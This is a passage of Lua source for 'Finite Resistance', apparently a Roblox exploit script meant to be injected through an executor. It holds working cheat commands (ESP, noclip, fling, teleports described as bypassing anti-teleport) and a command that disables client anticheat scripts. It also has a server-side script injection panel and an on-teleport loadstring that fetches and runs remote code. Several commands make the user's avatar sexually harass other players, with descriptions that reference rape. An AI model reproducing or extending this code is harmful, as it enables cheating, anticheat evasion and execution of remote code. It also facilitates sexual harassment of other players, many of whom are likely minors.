		Padding = UDim.new(0, 10),
		FillDirection = Enum.FillDirection.Horizontal,
		HorizontalAlignment = Enum.HorizontalAlignment.Left,
		SortOrder = Enum.SortOrder.LayoutOrder,
	}, btns)

	local btn_tmp = instance_new("TextButton", {
		AutomaticSize = Enum.AutomaticSize.X,
		BackgroundColor3 = Color3.fromRGB(30, 30, 30),
		Size = UDim2.fromOffset(0, 40),
		BackgroundTransparency = 1,
		TextTransparency = 1,
		BorderSizePixel = 0,
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.SemiBold, Enum.FontStyle.Normal),
		Text = "template",
		TextColor3 = Color3.fromRGB(200, 200, 200),
		TextSize = 18,
	})

	instance_new("UIPadding", {
		Name = "padding",
		PaddingTop = UDim.new(0, 10),
		PaddingBottom = UDim.new(0, 10),
		PaddingLeft = UDim.new(0, 10),
		PaddingRight = UDim.new(0, 10),
	}, btn_tmp)

	local at_all = btn_tmp:Clone()
	at_all.LayoutOrder = 0
	at_all.Text = "Attempt Included"
	at_all.Name = "attempt_all"
	at_all.Parent = btns
	local at = btn_tmp:Clone()
	at.LayoutOrder = 1
	at.Text = "Attempt"
	at.Name = "attempt"
	at.Parent = btns
	local ex = btn_tmp:Clone()
	ex.LayoutOrder = 2
	ex.Text = "Exclude"
	ex.Name = "exclude"
	ex.Parent = btns
	local inc = btn_tmp:Clone()
	inc.LayoutOrder = 3
	inc.Text = "Include"
	inc.Name = "include"
	inc.Parent = btns
	local ed = btn_tmp:Clone()
	ed.LayoutOrder = 4
	ed.Text = "Editor"
	ed.Name = "editor"
	ed.Parent = btns

	local res = instance_new("ScrollingFrame", {
		Name = "remotes",
		AutomaticSize = Enum.AutomaticSize.X,
		AutomaticCanvasSize = Enum.AutomaticSize.XY,
		CanvasSize = UDim2.fromScale(0, 0),
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		LayoutOrder = 2,
		Position = UDim2.fromOffset(0, 105),
		Size = UDim2.new(1, 0, 0, 400),
		ScrollBarThickness = 0,
	}, cntr)

	instance_new("UIListLayout", {
		Name = "layout",
		Padding = UDim.new(0, 5),
		FillDirection = Enum.FillDirection.Vertical,
		HorizontalAlignment = Enum.HorizontalAlignment.Center,
	}, res)

	local code = instance_new("TextBox", {
		Name = "code",
		BackgroundColor3 = Color3.fromRGB(50, 50, 50),
		BackgroundTransparency = 1,
		BorderColor3 = Color3.fromRGB(100, 100, 100),
		BorderSizePixel = 2,
		Size = UDim2.new(1, 0, 0, 400),
		Position = UDim2.fromOffset(0, 105),
		MultiLine = true,
		ClearTextOnFocus = false,
		TextWrapped = true,
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal),
		TextTransparency = 1,
		PlaceholderColor3 = Color3.fromRGB(178, 178, 178),
		TextColor3 = Color3.fromRGB(178, 178, 178),
		PlaceholderText = "Paste in SS script to execute",
		Text = "",
		TextSize = 15,
	}, cntr)

	instance_new("UIPadding", {
		Name = "padding",
		PaddingTop = UDim.new(0, 5),
		PaddingBottom = UDim.new(0, 5),
		PaddingLeft = UDim.new(0, 5),
		PaddingRight = UDim.new(0, 5),
	}, code)

	local tmp = instance_new("TextButton", {
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundColor3 = Color3.fromRGB(30, 30, 30),
		BackgroundTransparency = .7,
		BorderSizePixel = 0,
		Size = UDim2.fromOffset(0, 25),
		Text = "",
		TextTransparency = 1,
	})

	instance_new("UIPadding", {
		Name = "padding",
		PaddingTop = UDim.new(0, 10),
		PaddingBottom = UDim.new(0, 10),
		PaddingLeft = UDim.new(0, 10),
		PaddingRight = UDim.new(0, 10),
	}, tmp)

	instance_new("ImageLabel", {
		Name = "icon",
		BackgroundTransparency = 1,
		Position = UDim2.fromScale(0, 0),
		Size = UDim2.fromOffset(25, 25),
		Image = "http://www.roblox.com/asset/?id=13936075598",
	}, tmp)

	instance_new("TextLabel", {
		Name = "txt",
		AnchorPoint = Vector2.new(0, .5),
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		LayoutOrder = 0,
		Size = UDim2.fromScale(0, 0),
		Position = UDim2.new(0, 35, .5, 0),
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.SemiBold, Enum.FontStyle.Normal),
		Text = "a",
		TextColor3 = Color3.fromRGB(255, 255, 255),
		TextSize = 14,
	}, tmp)	

	return cntr, tmp
end

function make_fps(): TextLabel
	local fps = instance_new("TextLabel", {
		Visible = false,
		AnchorPoint = Vector2.new(1, 0),
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundColor3 = Color3.fromRGB(0, 0, 0),
		BackgroundTransparency = .5,
		BorderSizePixel = 0,
		Position = UDim2.fromScale(1, 0),
		Size = UDim2.fromScale(0, 0),
		ZIndex = 20,
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.SemiBold, Enum.FontStyle.Normal),
		Text = "fps",
		TextColor3 = Color3.fromRGB(255, 255, 255),
		TextSize = 14,
	})

	instance_new("UIPadding", {
		Name = "padding",
		PaddingTop = UDim.new(0, 10),
		PaddingBottom = UDim.new(0, 10),
		PaddingLeft = UDim.new(0, 10),
		PaddingRight = UDim.new(0, 10),
	}, fps)

	return fps
end

function make_notif(): TextLabel
	local notif = instance_new("TextLabel", {
		Name = "notification",
		AnchorPoint = Vector2.new(1, 1),
		AutomaticSize = Enum.AutomaticSize.XY,
		BackgroundColor3 = Color3.fromRGB(0, 0, 0),
		BackgroundTransparency = 0.3,
		BorderSizePixel = 0,
		Position = UDim2.fromScale(1, 1),
		Size = UDim2.fromScale(0, 0),
		TextTransparency = 0,
		FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal),
		RichText = true,
		Text = "",
		TextColor3 = Color3.fromRGB(255, 255, 255),
		TextSize = 15,
	})
	
	instance_new("UIPadding", {
		Name = "padding",
		PaddingTop = UDim.new(0, 15),
		PaddingBottom = UDim.new(0, 15),
		PaddingLeft = UDim.new(0, 20),
		PaddingRight = UDim.new(0, 20),
	}, notif)
	
	return notif
end

local gui: ScreenGui, tmp_elem: TextButton
local gui_open = false
local esp_viewer, inventory_temp
local spectate
local backdoor, backdoor_temp
local fps
local notif_tmp
local sttngs

local cntr: Frame
local cmdbar: Frame
local list: ScrollingFrame

function reset_ui()
	gui, tmp_elem = make_cmdbar()
	gui_open = false

	esp_viewer, inventory_temp = make_esp_viewer()
	esp_viewer.Parent = gui

	spectate = make_spectate()
	spectate.Parent = gui

	backdoor, backdoor_temp = make_backdoor()
	backdoor.Parent = gui

	fps = make_fps()
	fps.Parent = gui

	notif_tmp = make_notif()
	
	sttngs = make_settings()
	sttngs.Parent = gui
	
	cntr = gui.cntr
	cmdbar = cntr.cmdbar
	list = cntr.list
end

reset_ui()

local load_label: TextLabel = instance_new("TextLabel", {
	Name = "load_lbl",
	Text = "Finite Resistance",
	TextColor3 = Color3.fromRGB(230, 230, 230),
	BackgroundTransparency = .7,
	BorderSizePixel = 0,
	BackgroundColor3 = Color3.fromRGB(0, 0, 0),
	Size = UDim2.fromScale(1.2, .1),
	Position = UDim2.fromScale(-1.3, .5),
	AnchorPoint = Vector2.new(0, .5),
	TextScaled = true,
	FontFace = Font.new("rbxassetid://12187372629", Enum.FontWeight.Bold, Enum.FontStyle.Normal),
	Visible = true,
}, gui)

task.spawn(function()
	task.wait(1)
	print(`Finite Resistance (made by @artofcoding212 on Discord) is injected. Press {tostring(OPEN_KEYBIND.Name)} and start typing a command to begin.`)
	tween(load_label, TweenInfo.new(0.5, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), { Position = UDim2.fromScale(-.1, .5) })
	task.wait(.5)
	tween(load_label, TweenInfo.new(2, Enum.EasingStyle.Exponential, Enum.EasingDirection.In), { Position = UDim2.fromScale(1, .5), TextTransparency = 1, BackgroundTransparency = 1 })
	game:GetService("Debris"):AddItem(load_label, 2)
	notify("Finite Resistance", `Welcome to Finite Resistance!\n<b>Press {OPEN_KEYBIND.Name} to start.</b>\nJoin the Discord by using the discord command.`, 12)
end)

function set_open(t: boolean)
	local ti = TweenInfo.new(0.3, Enum.EasingStyle.Sine)
	gui_open = t

	if t then
		cmdbar.box.Text = ""
		cmdbar.box.Active = true
		cntr.Visible = true
		list.CanvasPosition = Vector2.new(0,0)
		tween(cmdbar, ti, { BackgroundTransparency=0 })
		tween(cmdbar.box, ti, { TextTransparency=0 })
		tween(list, ti, { BackgroundTransparency=.3 })
		for _, e in filter(list:GetChildren(), function(x: Instance) return x:IsA("TextButton") end) do
			tween(e.txt, ti, { TextTransparency=0 })
		end
		tween(filter(list:GetChildren(), function(x: Instance) return x:IsA("TextButton") end), ti, { BackgroundTransparency=0 })
		cmdbar.box:CaptureFocus()
	else
		cmdbar.box.Active = false
		cmdbar.box:ReleaseFocus()
		tween(cmdbar, ti, { BackgroundTransparency=1 })
		tween(cmdbar.box, ti, { TextTransparency=1 })
		tween(list, ti, { BackgroundTransparency=1 })
		for _, e in filter(list:GetChildren(), function(x: Instance) return x:IsA("TextButton") end) do
			tween(e.txt, ti, { TextTransparency=1 })
		end
		tween(filter(list:GetChildren(), function(x: Instance) return x:IsA("TextButton") end), ti, { BackgroundTransparency=1 })
		delay(.3, function()
			cntr.Visible = false
		end)
	end
end

local commands: {[string]: {fn: (args: {string})->(), frame: Frame}} = {}
local tooltip_label = instance_new("TextLabel", {
	Name = "tooltip",
	BackgroundTransparency = 0.5,
	Text = "",
	AutomaticSize = Enum.AutomaticSize.XY,
	BackgroundColor3 = Color3.fromRGB(50, 50, 50),
	TextColor3 = Color3.fromRGB(200, 200, 200),
	FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal),
	TextSize = 27,
	RichText = true,
	Visible = false,
}, gui)

instance_new("UIPadding", {
	Name = "padding",
	PaddingTop = UDim.new(0, 3),
	PaddingBottom = UDim.new(0, 3),
	PaddingLeft = UDim.new(0, 3),
	PaddingRight = UDim.new(0, 3),
}, tooltip_label)

local UNNOTIFY: (()->())? = nil

function notify(title: string, s: string, t: number|"inf")
	if UNNOTIFY then
		UNNOTIFY()
	end

	local n = notif_tmp:Clone()
	n.Position = UDim2.fromScale(2, 1)
	n.Text = `<b><font size="25">{title}</font></b>\n{s}`
	n.Parent = gui
	
	local active = true
	
	UNNOTIFY = function()
		active = false
		
		if not n then
			return
		end
		
		tween(n, TweenInfo.new(.5, Enum.EasingStyle.Exponential, Enum.EasingDirection.In), {Position=UDim2.fromScale(2, 1)})
		delay(.5, function()
			n:Destroy()
			n = nil
		end)
	end
	
	tween(n, TweenInfo.new(.5, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), {Position=UDim2.fromScale(1, 1)})
	
	if t ~= "inf" then
		delay(t, function()
			if not active then
				return
			end
			
			UNNOTIFY()
		end)
	end
end

function tooltip(text: string): ()->()
	local en = true
	local x = tooltip_label:Clone()
	x.Text = text
	x.Visible = true
	x.Parent = gui

	conn(rs.Heartbeat, function(c)
		if not en then
			c:Disconnect()
			return
		end

		x.Position = UDim2.fromOffset(mouse.X+15, mouse.Y)
	end)

	return function()
		x.Visible = false
		x:Destroy()
		en = false
	end
end

function UpdateSettings()
	if WriteFile==nil then
		notify("Unable to save", "We cannot save your data due to an insufficient executor.", 60)
		return
	end
	WriteFile("FR_Saves.txt", http:JSONEncode({ openKeybind = OPEN_KEYBIND.Name }))
end

function WriteDefaultSaves()
	if WriteFile==nil then
		notify("Unable to save", "We cannot save your data due to an insufficient executor.", 60)
		return
	end
	notify("Wrote default save file", "We couldn't find a savefile and so we loaded the default settings.", 30)
	OPEN_KEYBIND = Enum.KeyCode.End
	WriteFile("FR_Saves.txt", http:JSONEncode({ openKeybind = "End" }))
end

if ReadFile~=nil then
	local success, out = ReadFile("FR_Saves.txt")
	if success and out~=nil and typeof(out)=="string" then
		local json = http:JSONDecode(out)
		if json==nil or not json.openKeybind then
			WriteDefaultSaves()
		else
			OPEN_KEYBIND = Enum.KeyCode[json.openKeybind]
		end
	else
		WriteDefaultSaves()
	end
else
	WriteDefaultSaves()
end

sttngs.cntr.keybind.update.Activated:Connect(function()
	sttngs.cntr.keybind.update.Text = 'Listening <font size="10"><i>(BACKSPACE to stop)</i></font>'
	conn(uis.InputBegan, function(c: RBXScriptConnection, inp: InputObject, proc: boolean)
		if inp.KeyCode == Enum.KeyCode.Backspace or inp.KeyCode == nil or inp.UserInputType ~= Enum.UserInputType.Keyboard then
			c:Disconnect()
			return
		end
		OPEN_KEYBIND = inp.KeyCode
		c:Disconnect()
	end, function()
		sttngs.cntr.keybind.update.Text = OPEN_KEYBIND.Name
		UpdateSettings()
	end)
end)

function add_command(name: string, desc: string, args: {string}, aliases: {string}, callback: (args: {string})->())
	local new = tmp_elem:Clone()
	instance_new("StringValue", {
		Name = "name",
		Value = name,
	}, new)

	local text = name
	if #args > 0 then
		local buf = ""

		for i, a in args do
			buf = buf..`{a}{i<#args and ", " or ""}`
		end

		text = text..`<i> [{buf}]</i>`
	end
	if #aliases > 0 then
		local buf = ""

		for i, a in aliases do
			buf = buf..`{a}{i<#aliases and ", " or ""}`
			commands[a] = {fn=callback, frame=new}
		end

		text = text..`<font size="13"> ({buf})</font>`
	end

	new.Activated:Connect(function()
		set_open(false)
		callback({})
	end)

	local tooltip_off: (()->())? = nil

	new.MouseEnter:Connect(function()
		if not gui_open then
			return
		end

		tooltip_off = tooltip(desc)
	end)

	new.MouseLeave:Connect(function()
		if tooltip_off then
			tooltip_off()
		end
	end)

	new.txt.Text = text
	new.Parent = list
	commands[name] = {fn=callback, frame=new}
end

function exec_cmd(c: string)
	local args = c:split(" ")
	local name = args[1]
	table.remove(args, 1)

	for n, c in commands do
		if n == name then
			pcall(c.fn, args)
			break
		end
	end
end

cmdbar.box.FocusLost:Connect(function(e)
	set_open(false)
	exec_cmd(cmdbar.box.Text)
end)

cmdbar.box:GetPropertyChangedSignal("Text"):Connect(function()
	local txt = cmdbar.box.Text

	if txt:len() == 0 or txt == "" then
		for _, c in commands do
			c.frame.Visible = true
		end
	else
		local result = search(extract_keys(commands), txt:split(" ")[1])
		local frames: {{f: Frame, r: number}} = {}

		for n, c in commands do
			local m = false

			for _, v in result do
				if v.raw == n then
					m = v
					break
				end
			end

			if m == false or m.ratio <= 0.05 then
				c.frame.Visible = false
				c.frame.LayoutOrder = 999
				continue
			end

			table.insert(frames, {f=c.frame, r=m.ratio})
		end

		table.sort(frames, function(a, b)
			return a.r > b.r
		end)

		local new_frames: {{i: number, f: Frame}} = {}
		local seen_frames: {Frame} = {}

		for i, v in ipairs(frames) do
			local m = false

			for _, f in seen_frames do
				if f.txt.Text == v.f.txt.Text then
					m = true
					break					
				end
			end

			if m then
				continue
			end

			table.insert(seen_frames, v.f)
			table.insert(new_frames, {f=v.f, i=v.r})
		end

		for _, f in ipairs(new_frames) do
			f.f.LayoutOrder = f.i
			f.f.Visible = true
		end
	end
end)

local SCROLL_HOVER: {{sf: ScrollingFrame, i: number}} = {}

uis.InputChanged:Connect(function(i)
	if i.UserInputType == Enum.UserInputType.MouseWheel then
		for _, a in SCROLL_HOVER do
			if not a.sf.ScrollingEnabled then
				a.sf.CanvasPosition += Vector2.new(0, a.i*i.Position.Z*-1)
			end
		end
	end
end)

function better_scroll(sf: ScrollingFrame, inc: number)
	sf.ScrollingEnabled = true

	sf.MouseEnter:Connect(function()
		table.insert(SCROLL_HOVER, {i=inc, sf=sf})
		sf.ScrollingEnabled = false
		cas:BindAction("custom_scroll", function()
			return Enum.ContextActionResult.Sink
		end, false, Enum.UserInputType.MouseWheel)
	end)

	sf.MouseLeave:Connect(function()
		sf.ScrollingEnabled = true
		cas:UnbindAction("custom_scroll")
	end)
end

better_scroll(list, 13)
better_scroll(esp_viewer.inventory.inv, 20)
better_scroll(backdoor.remotes, 16)

uis.InputBegan:Connect(function(i, p)
	if p and i.KeyCode == Enum.KeyCode.Tab and gui_open and cmdbar.box:IsFocused() then
		local l = filter(filter(list:GetChildren(), function(x) return x:IsA("TextButton") end), function(x: Frame) return x.LayoutOrder <= 1 end)
		if #l >= 1 then
			task.wait(.02)
			cmdbar.box.Text = l[1].name.Value.." "
			cmdbar.box.CursorPosition = cmdbar.box.Text:len()
			cmdbar.box:CaptureFocus()
		else
			task.wait(.02)
			cmdbar.box.Text = cmdbar.box.Text:gsub("\t", "")
			cmdbar.box.CursorPosition = cmdbar.box.Text:len()
		end

		return
	end

	if p then
		return
	end

	if i.KeyCode == OPEN_KEYBIND then
		set_open(not gui_open)
	end
end)

function arg_plr(arg: string): Player?
	if tonumber(arg) and plrs:GetPlayerByUserId(tonumber(arg)) then
		return plrs:GetPlayerByUserId(tonumber(arg))
	end

	if arg:len() < 1 then
		return
	end

	if arg == "me" then
		return client
	end

	if arg == "random" then
		local list = {}

		for _, plr in plrs:GetPlayers() do
			if plr.UserId ~= client.UserId then
				table.insert(list, plr)
			end
		end

		if #list == 0 then
			return nil
		end

		return list[math.random(1, #list)]
	end

	if arg:sub(1, 1)=="@" and arg:len()>1 then
		return plrs[arg:sub(2, arg:len())]
	end

	local names = {}
	local displays = {}

	for _, plr in plrs:GetPlayers() do
		table.insert(names, plr.Name)
		table.insert(displays, plr.DisplayName)
	end

	local matches_name = search(names, arg)
	local matches_display = search(names, arg)

	local highest = 0
	local is_name = true
	local val = nil

	for _, v in matches_name do
		if v.ratio > highest then
			highest = v.ratio
			val = v.raw
		end
	end

	for _, v in matches_display do
		if v.ratio > highest then
			highest = v.ratio
			val = v.raw
			is_name = false
		end
	end

	if val ~= nil then
		for _, plr in plrs:GetPlayers() do
			if (is_name and plr.Name == val) or (not is_name and plr.DisplayName == val) then
				return plr
			end
		end
	end

	return nil
end

local RELOADTP = true 
conn(client.OnTeleport, function(c)
	if not RELOADTP then
		return
	end

	if queue_on_teleport then
		queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/artofcoding212/FiniteResistance/refs/heads/main/finiteresistance.lua"))()')
	end
end)
add_command("reloadtp", "disables/enables <font size=\"15\">(enabled by default)</font> reloading the latest version of the script on teleport", {}, {}, function(args)
	RELOADTP = not RELOADTP
end)

local SETTINGSOPEN = false

function openSettings(val: boolean)
	local ti = TweenInfo.new(.3, Enum.EasingStyle.Sine)
	if val then
		sttngs.BackgroundTransparency = 1
		sttngs.Visible = true
		tween(sttngs, ti,{BackgroundTransparency=0.3})
		
		sttngs.title.title.TextTransparency = 1
		tween(sttngs.title.title, ti,{TextTransparency=0})
		
		sttngs.cntr.BackgroundTransparency = 1
		tween(sttngs.cntr, ti,{BackgroundTransparency=0.5})
		
		for _, item in sttngs.cntr:GetChildren() do
			if item:IsA("Frame") then
				item.update.BackgroundTransparency = 1
				item.update.TextTransparency = 1
				tween(item.update, ti,{BackgroundTransparency=0, TextTransparency=0})
				item.title.TextTransparency = 1
				tween(item.title, ti,{ TextTransparency=0})
			end
		end
	else
		tween(sttngs, ti,{BackgroundTransparency=1})
		tween(sttngs.title.title, ti,{TextTransparency=1})
		tween(sttngs.cntr, ti,{BackgroundTransparency=1})

		for _, item in sttngs.cntr:GetChildren() do
			if item:IsA("Frame") then
				tween(item.update, ti,{BackgroundTransparency=1, TextTransparency=1})
				tween(item.title, ti,{ TextTransparency=1})
			end
		end
	end
end

add_command("settings", "toggles the settings menu", {}, {}, function(args)
	openSettings(not SETTINGSOPEN)
	SETTINGSOPEN = not SETTINGSOPEN
end)

add_command("discord", "attempts to copy the discord link", {}, {}, function(args)
	if setclipboard then
		setclipboard("https://discord.gg/G79ZucGAwW")
		notify("Discord", `<b>Copied to clipboard!</b>`, 3)
		return
	end
	
	notify("Discord", `<b><font color="rgb(255, 235, 20)">Your executor isn't supported for the discord command.</font></b>\nTry joining at https://discord.gg/G79ZucGAwW!`, 12)
end)

local SHADOWS_EN = true
local SHADOWS_MAP: {[Instance]: boolean} = {}
add_command("shadows", "toggle shadows (reduces lag)", {}, {}, function(args)
	SHADOWS_EN = not SHADOWS_EN

	for _, p in workspace:GetDescendants() do
		if p:IsA("BasePart") and SHADOWS_MAP[p] == nil then
			SHADOWS_MAP[p] = p.CastShadow
		end
	end

	if SHADOWS_EN == false then
		for p, _ in SHADOWS_MAP do
			p.CastShadow = false
		end
	else
		for p, e in SHADOWS_MAP do
			p.CastShadow = e
		end
	end
end)

add_command("antilag", "disables textures+shadows, boosting FPS", {}, {}, function(args)
	for _, p in workspace:GetDescendants() do
		if p:IsA("BasePart") then
			p.CastShadow = false
			p.Material = Enum.Material.SmoothPlastic
		elseif p:IsA("Texture") then
			p:Destroy()
		end
	end
end)

add_command("fps", "toggle fps menu", {}, {}, function(args)
	fps.Visible = not fps.Visible
end)

add_command("disablehiddenscripts", "disables hidden enabled client scripts, sometimes anticheats are hidden here", {}, {"disscripts", "dishs"}, function(args)
	if not getnilinstances then
		notify("DisableHiddenScripts", `<b><font color="rgb(255, 235, 20)">Your executor isn't supported for disablehiddenscripts.</font></b>`, 3)
		return
	end

	for _, s in getnilinstances() do
		if s:IsA("LocalScript") and s ~= script then
			s.Enabled = false
		end
	end
end)

local FLING = false
add_command("fling", "fling the target", {"target"}, {}, function(args)
	local plr = arg_plr(args[1] or nil)
	if not (plr and plr.Character and client.Character) then return end
	
	local start = client.Character.HumanoidRootPart.CFrame
	exec_cmd("unspin")
	exec_cmd("spin 9999999")
	
	FLING = true
	
	conn(rs.RenderStepped, function(c)
		if not (plr.Character and client.Character and FLING) then
			c:Disconnect()
			return
		end
		
		print("yes")
		client.Character.Humanoid.PlatformStand = false
		client.Character.HumanoidRootPart.Velocity = (plr.Character.HumanoidRootPart.CFrame-client.Character.HumanoidRootPart.Position).Position*3
	end, function()
		exec_cmd("unspin")
		client.Character:SetPrimaryPartCFrame(start)
	end)
end)

add_command("unfling", "stop flinging", {}, {}, function(args)
	FLING = false
end)

local FLOAT_HEIGHT: number = client.Character and client.Character.HumanoidRootPart.Position.Y-3.5 or 0
local FLOAT_CONN = nil
local FLOAT = false
add_command("float", "flight but bad: press RightCtrl+1 to go up and RightCtrl+2 to go down", {}, {}, function(args)
	local part: Part = instance_new("Part", {
		Name = "float_part",
		Size = Vector3.new(5, .5, 5),
		CanCollide = true,
		Anchored = true,
		Color = Color3.fromRGB(255, 0, 0),
		Transparency = .8,
	}, workspace)

	FLOAT_HEIGHT = client.Character.HumanoidRootPart.Size.Y+client.Character.Humanoid.HipHeight-.75

	FLOAT_CONN = client.Character.Humanoid.Died:Connect(function()
		FLOAT_CONN:Disconnect()
		if part then
			part:Destroy()
		end
		FLOAT = false
	end)

	FLOAT = true

	conn(rs.Heartbeat, function(c)
		if not FLOAT then
			c:Disconnect()
			return
		end

		if uis:IsKeyDown(Enum.KeyCode.RightControl) then
			if uis:IsKeyDown(Enum.KeyCode.One) then
				FLOAT_HEIGHT += client.Character.Humanoid.HipHeight/8
			elseif uis:IsKeyDown(Enum.KeyCode.Two) then
				FLOAT_HEIGHT -= client.Character.Humanoid.HipHeight/8
			end
		end

		if not client.Character then
			return
		end

		local hrp = client.Character:WaitForChild("HumanoidRootPart")
		part.Position = Vector3.new(hrp.Position.X, FLOAT_HEIGHT, hrp.Position.Z)
	end, part.Destroy, part)
end)

add_command("unfloat", "turns off float", {}, {}, function(args)
	FLOAT = false
	if FLOAT_CONN then
		FLOAT_CONN:Disconnect()
	end
end)

local PLAYER_ESP: boolean = false
local ESP_MIN: number = 0
local ESP_MAX: number = math.huge
add_command("esp", "highlights everyone and their full usernames (press F4 on someone for more information)", {}, {}, function(args)
	PLAYER_ESP = true
end)

add_command("unesp", "turn off esp", {}, {}, function(args)
	PLAYER_ESP = false
end)

add_command("espradius", "set esp radius", {"min?", "max?"}, {"esprad"}, function(args)
	ESP_MIN = (args[1] and tonumber(args[1])) and tonumber(args[1]) or 0
	ESP_MAX = (args[2]) and tonumber(args[2]) and tonumber(args[2]) or math.huge
end)

function goto(char: Model, studs_behind: number)
	local prim_pos = char.PrimaryPart.Position
	client.Character:SetPrimaryPartCFrame(CFrame.new(prim_pos-char.PrimaryPart.CFrame.LookVector*studs_behind, prim_pos))
end

add_command("goto", "instant transmissions behind someone", {"target", "studs-behind?"}, {}, function(args)
	if #args < 1 or not client.Character then
		return
	end

	local plr = arg_plr(args[1])

	if not plr then
		return
	end

	local char = plr.Character

	if not char then
		return
	end

	local behind = args[2] and tonumber(args[2]) or nil
	goto(char, behind == nil and 5 or behind)
end)

add_command("forcegoto", "bypasses some antiteleport by spam teleporting to someone for a duration of time", {"target", "duration?", "studs-behind?"}, {"fgoto"}, function(args)
	if #args < 1 or not client.Character then
		return
	end

	local plr = arg_plr(args[1])

	if not plr then
		return
	end

	local char = plr.Character

	local behind = args[3] and tonumber(args[3]) or nil
	local duration = args[2] and tonumber(args[2]) or nil
	local en = true

	task.delay(duration == nil and 1 or duration, function()
		en = false
	end)

	conn(rs.RenderStepped, function(c)
		if not en then
			c:Disconnect()
			return
		end

		goto(char, behind == nil and 5 or behind)
	end)
end)

add_command("lerpgoto", "bypasses a lot of antiteleports by gradually teleporting", {"target", "speed?"}, {"lgoto"}, function(args)
	if #args < 1 or not client.Character then
		return
	end

	local plr = arg_plr(args[1])

	if not plr or not plr.Character then
		return
	end

	local hrp = client.Character.HumanoidRootPart
	local plr_hrp = plr.Character.HumanoidRootPart

	local dist = (plr_hrp.Position - hrp.Position).Magnitude
	local speed = ((args[2] and tonumber(args[2])) and tonumber(args[2]) or 0.1)*10
	local steps = math.floor(dist/speed)
	local dir = (plr_hrp.Position - hrp.Position).Unit
	local init = hrp.CFrame

	for i = 1, steps do
		client.Character:SetPrimaryPartCFrame(init+dir*i)
		task.wait(speed/100)
	end
end)

local TP = false
add_command("teleport", "press T to teleport", {}, {"tp"}, function(args)
	TP = true
end)

add_command("unteleport", "turn off tp", {}, {"untp"}, function(args)
	TP = false
end)

local NOCLIP = false
local CLIP_TREE: {[BasePart]: boolean} = {}
add_command("noclip", "go through walls!1!!!1!1!!", {}, {}, function(args)
	NOCLIP = true

	conn(rs.Heartbeat, function(c)
		if not NOCLIP then
			c:Disconnect()
			return
		end

		if not client.Character then
			return
		end

		for _, o in client.Character:GetDescendants() do
			if not CLIP_TREE[o] and o:IsA("BasePart") then
				CLIP_TREE[o] = o.CanCollide
			end
		end

		for o, _ in CLIP_TREE do
			if o then
				o.CanCollide = false
			end
		end
	end)
end)

add_command("unnoclip", "turns off noclip", {}, {"clip"}, function(args)
	NOCLIP = false

	for o, b in CLIP_TREE do
		o.CanCollide = b
	end
end)

local BANG = false
add_command("bang", "~daddy~ rapes someone", {"target", "speed?"}, {"rape"}, function(args)
	exec_cmd("unbang")

	local target = arg_plr(args[1] or nil)
	local speed = tonumber(args[2] or nil) or 1
	if not client.Character or not target then
		return
	end

	BANG = true

	local hum = client.Character:FindFirstChildOfClass("Humanoid")
	hum.Sit = true

	local offs = 0
	local out = true
	conn(rs.RenderStepped, function(c)
		if not BANG then
			c:Disconnect()
			return
		end
		
		if not target.Character:FindFirstChild("HumanoidRootPart") or not client.Character:FindFirstChild("HumanoidRootPart") then
			hum.Sit = false
			return
		end
		
		hum.Sit = true
		
		if out then
			offs += .08*speed
			if offs >= 2 then
				out = false
				offs = 2
			end
		else
			offs -= .08*speed
			if offs <= 0 then
				out = true
				offs = 0
			end
		end

		client.Character.HumanoidRootPart.CFrame = target.Character:WaitForChild("HumanoidRootPart").CFrame*CFrame.new(0, 0, 0.5+offs)
		for _, limb in client.Character:GetDescendants() do
			if limb:IsA("BasePart") then
				limb.Velocity = Vector3.zero
				limb.Massless = true
			end
		end
	end)
end)

add_command("unbang", "stop raping someone", {}, {"unrape"}, function(args)
	BANG = false
	client.Character.Humanoid.Sit = false
	for _, limb in client.Character:GetDescendants() do
		if limb:IsA("BasePart") then
			limb.Massless = false
		end
	end
end)

local HEADSIT = false
add_command("headsit", "make the target suck ur big fat dick/pussy", {"target?"}, {}, function(args)
	exec_cmd("unheadsit")
	
	local target = arg_plr(args[1] or nil)
	if not client.Character or not target then
		return
	end
	
	HEADSIT = true

	local hum = client.Character:FindFirstChildOfClass("Humanoid")
	hum.Sit = true
	
	conn(rs.RenderStepped, function(c)
		if not HEADSIT then
			c:Disconnect()
			return
		end
		
		if not target.Character:FindFirstChild("HumanoidRootPart") or not client.Character:FindFirstChild("HumanoidRootPart") then
			hum.Sit = false
			return
		end
		
		hum.Sit = true
		client.Character.HumanoidRootPart.CFrame = (target.Character:WaitForChild("HumanoidRootPart").CFrame*CFrame.new(0, .97, -1.5))*CFrame.Angles(math.pi+1, 0, 0)
		for _, limb in client.Character:GetDescendants() do
			if limb:IsA("BasePart") then
				limb.Velocity = Vector3.zero
				limb.Massless = true
			end
		end
	end)
end)

add_command("unheadsit", "stop headsitting", {}, {}, function(args)
	HEADSIT = false
	client.Character.Humanoid.Sit = false
	for _, limb in client.Character:GetDescendants() do
		if limb:IsA("BasePart") then
			limb.Massless = false
		end
	end
end)

local IS69 = false
add_command("69", "do the 69 on the target", {"target?"}, {}, function(args)
	exec_cmd("unheadsit")

	local target = arg_plr(args[1] or nil)
	if not client.Character or not target then
		return
	end

	IS69 = true

	local hum = client.Character:FindFirstChildOfClass("Humanoid")
	hum.Sit = true

	conn(rs.RenderStepped, function(c)
		if not IS69 then
			c:Disconnect()
			return
		end

		if not target.Character:FindFirstChild("HumanoidRootPart") or not client.Character:FindFirstChild("HumanoidRootPart") then
			hum.Sit = false
			return
		end

		hum.Sit = true
